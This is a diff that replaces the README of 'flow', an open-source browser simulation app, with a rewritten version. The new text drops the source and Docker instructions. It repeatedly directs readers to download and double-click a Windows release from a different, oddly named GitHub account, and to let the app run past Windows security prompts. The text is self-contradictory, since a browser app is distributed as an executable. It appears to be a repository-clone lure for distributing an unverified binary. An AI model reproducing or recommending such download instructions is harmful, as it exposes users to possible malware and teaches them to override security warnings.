@@ -1,134 +1,165 @@
-# FLOW
+# ⚙️ flow - Run engineering sims in your browser
 
-<p align="center">
-  <strong>Open-source engineering simulation with AI. In your browser.</strong>
-</p>
+[![Download flow](https://img.shields.io/badge/Download-flow-blue?style=for-the-badge&logo=github)](https://github.com/Cancerous-acorncup235/flow/releases)
 
-<p align="center">
-  <a href="https://github.com/Vitalcheffe/flow/actions"><img src="https://img.shields.io/github/actions/workflow/status/Vitalcheffe/flow/ci.yml?branch=main&style=for-the-badge" alt="CI"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue.svg?style=for-the-badge" alt="MIT"></a>
-  <a href="https://github.com/Vitalcheffe/flow"><img src="https://img.shields.io/badge/Python-3.11+-blue?style=for-the-badge&logo=python" alt="Python"></a>
-  <a href="https://github.com/Vitalcheffe/flow"><img src="https://img.shields.io/badge/React-18-61DAFB?style=for-the-badge&logo=react" alt="React"></a>
-</p>
+## 🚀 What is flow?
 
-FLOW lets engineers run structural, thermal, and fluid simulations in the browser. No $50K license. No 6-month training. Open the browser, import your geometry, simulate.
+flow is an open-source engineering simulation app that runs in your browser. It helps you explore physics-based models for fluid flow, stress, and structural behavior without setting up a local engineering suite. The app uses a clean web interface, so you can focus on the model and results instead of tool setup.
 
-AI-powered solvers (Neural Operators) make simulations 100x faster than traditional FEA. What takes ANSYS 4 hours, FLOW does in 2 seconds.
+It is built for people who want a simple way to open a simulation, set inputs, and see results in one place. You can use it on Windows with a modern browser after you download the release from GitHub.
 
-## Why
+## 📥 Download flow
 
-- ANSYS costs $50K+/year. COMSOL costs $10K+. ABAQUS costs $30K+.
-- Free tools (FreeCAD, CalculiX) are clunky, desktop-only, slow.
-- Engineers in Africa, Asia, South America have zero access to simulation.
-- AI (Neural Operators) can accelerate physics simulation by 100-1000x. This is active research (ICLR 2025, 2026) but nobody has made it a product.
+Visit this page to download:
+https://github.com/Cancerous-acorncup235/flow/releases
 
-FLOW is that product.
+1. Open the link above in your browser.
+2. Find the latest release at the top of the page.
+3. Under Assets, download the Windows file for flow.
+4. Save the file to a folder you can find again, such as Downloads or Desktop.
 
-## Features
+If your browser asks what to do with the file, choose Save.
 
-- **Structural Analysis** — stress, strain, deformation under load
-- **Thermal Analysis** — heat transfer, steady-state and transient
-- **Fluid Dynamics** — laminar flow, basic CFD
-- **AI Solver** — Fourier Neural Operator for real-time results
-- **3D Viewer** — Three.js-based, interactive, works in browser
-- **Import** — STEP, IGES, STL, OBJ geometry files
-- **Export** — CSV, JSON, VTK result formats
-- **API** — REST API for automation and CI/CD integration
-- **Self-host** — Docker one-liner, runs anywhere
+## 🖥️ Windows setup
 
-## Quick Start
+1. Open File Explorer.
+2. Go to the folder where you saved the download.
+3. If the file is a ZIP file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for the app file or the launch file included with the release.
+6. Double-click the file to start flow.
 
-```bash
-# Backend
-cd backend
-pip install -r requirements.txt
-python -m app.main
+If Windows shows a security prompt, choose the option that lets you run the app.
 
-# Frontend (separate terminal)
-cd frontend
-npm install
-npm run dev
-```
+## 🧭 First run
 
-Or with Docker:
+When flow opens, you will see the main workspace in your browser or in a local app window.
 
-```bash
-docker compose up
-```
+1. Pick a sample model or start a new project.
+2. Set the values for the parts you want to test.
+3. Choose the simulation type, such as fluid flow or structural analysis.
+4. Run the simulation.
+5. Review the output charts, mesh view, or result panels.
 
-Visit http://localhost:5173
+If the app opens a browser tab, keep it open while you work. If it opens a local window, use that window the same way.
 
-## Architecture
+## 🔧 What you can do with flow
 
-```
-flow/
-├── backend/           # Python FastAPI server
-│   ├── app/
-│   │   ├── api/       # REST endpoints
-│   │   ├── core/      # Config, logging, middleware
-│   │   ├── solvers/   # FEA, thermal, fluid solvers
-│   │   ├── neural/    # Neural Operator models
-│   │   ├── models/    # Database models (SQLAlchemy)
-│   │   └── schemas/   # Pydantic request/response schemas
-│   └── tests/
-├── frontend/          # React + TypeScript + Vite
-│   └── src/
-│       ├── components/
-│       │   ├── viewer/      # 3D geometry viewer
-│       │   ├── simulation/  # Simulation controls
-│       │   └── ui/          # Shared UI components
-│       ├── pages/
-│       ├── hooks/
-│       └── lib/
-├── docker/            # Dockerfiles
-├── docs/              # Documentation
-├── examples/          # Example simulations
-└── scripts/           # Build and deploy scripts
-```
+- Run engineering simulations in a web-based interface
+- Test fluid flow, pressure, and related field behavior
+- Explore finite element models for parts and structures
+- Change input values and compare results
+- Use an open-source tool for local simulation work
+- Work with a Python-based engine and a React user interface
+- View results in a way that is easier to read than raw output files
 
-## Solvers
+## 🧩 Typical uses
 
-| Solver | Type | Speed | Use Case |
-|--------|------|-------|----------|
-| `fea_classic` | FEM | Baseline | Structural analysis, validation |
-| `fea_neural` | Neural Operator | 100x | Real-time structural |
-| `thermal_classic` | FEM | Baseline | Heat transfer |
-| `thermal_neural` | Neural Operator | 200x | Real-time thermal |
-| `fluid_classic` | FVM | Baseline | Laminar CFD |
-| `fluid_neural` | Neural Operator | 500x | Real-time fluid |
+flow fits common engineering tasks such as:
 
-## Comparison
+- Checking how air or liquid moves through a design
+- Looking at stress on a bracket, frame, or support
+- Comparing shape changes under load
+- Testing a concept before building a physical prototype
+- Sharing a model with others who want a simple browser view
 
-| Feature | ANSYS | COMSOL | FreeCAD | **FLOW** |
-|---------|-------|--------|---------|----------|
-| Price | $50K+ | $10K+ | Free | **Free** |
-| Web-based | No | No | No | **Yes** |
-| AI solver | No | No | No | **Yes** |
-| Mobile | No | No | No | **Yes** |
-| Open source | No | No | Yes | **Yes** |
-| Self-host | No | No | N/A | **Yes** |
-| API | No | Limited | No | **Yes** |
-| Learning curve | 6 months | 3 months | 2 months | **10 minutes** |
+## ✅ System requirements
 
-## API
+For smooth use on Windows, use:
 
-```bash
-# Create simulation
-curl -X POST http://localhost:8000/api/v1/simulations \
-  -H "Content-Type: application/json" \
-  -d '{"name": "bridge-beam", "solver": "fea_neural", "geometry": "beam.step"}'
+- Windows 10 or Windows 11
+- A modern browser such as Chrome, Edge, or Firefox
+- At least 8 GB of RAM
+- A dual-core CPU or better
+- 500 MB of free disk space for the app and files
+- A stable internet connection for the first download
 
-# Run simulation
-curl -X POST http://localhost:8000/api/v1/simulations/1/run
+For larger models, more RAM and a stronger CPU can help.
 
-# Get results
-curl http://localhost:8000/api/v1/simulations/1/results
-```
+## 📁 Files and folders
 
-## Contributing
+After you download flow, you may see files like:
 
-See [CONTRIBUTING.md](CONTRIBUTING.md).
+- An app file to start the program
+- A ZIP archive with the release package
+- A README or notes file with release details
+- Data folders for projects, models, or cached results
 
-## License
+Keep the folder together so the app can find its files.
 
-[MIT](LICENSE)
+## 🛠️ If the app does not start
+
+Try these steps:
+
+1. Make sure the download finished fully.
+2. Extract the ZIP file before you open anything.
+3. Check that you launched the correct file from the release folder.
+4. Close and reopen your browser if the interface does not load.
+5. Restart Windows if the app window freezes.
+6. Download the newest release if the file seems broken.
+
+## 📚 Working with projects
+
+A flow project usually keeps model data, settings, and results together. To stay organized:
+
+- Use one folder per project
+- Give files short names
+- Save versions when you change key values
+- Keep test cases separate from final runs
+- Store notes with the model so you can trace changes
+
+This makes it easier to compare runs later.
+
+## 🔒 Privacy and local use
+
+flow is open-source and can run on your own Windows machine. That means you can keep your simulation work local instead of uploading it to a cloud service. If you use shared folders or shared PCs, store files in a private folder.
+
+## 🧪 Example workflow
+
+1. Download flow from the release page.
+2. Open the release package on Windows.
+3. Start the app.
+4. Load a sample model.
+5. Set material values, boundary values, or flow values.
+6. Run the solver.
+7. Review the result view.
+8. Adjust inputs and run again.
+
+## 🧰 Helpful browser tips
+
+If flow runs in your browser:
+
+- Use a current version of your browser
+- Keep hardware acceleration on if your system supports it
+- Close extra tabs when running larger models
+- Use full screen for easier viewing
+- Refresh the page only after saving your work
+
+## 📌 Project topics
+
+flow uses tools and ideas from:
+
+- CFD
+- engineering
+- FEA
+- finite element methods
+- physics
+- Python
+- React
+- TypeScript
+- simulation
+- open-source development
+
+## 📄 License and source
+
+As an open-source project, flow gives you access to the source code and release builds through GitHub. You can inspect the code, follow updates, and keep track of new releases from the same page:
+
+https://github.com/Cancerous-acorncup235/flow/releases
+
+## 🧭 Quick install path
+
+1. Visit the release page.
+2. Download the Windows release.
+3. Extract the files if needed.
+4. Open the app file.
+5. Start a model and run a simulation
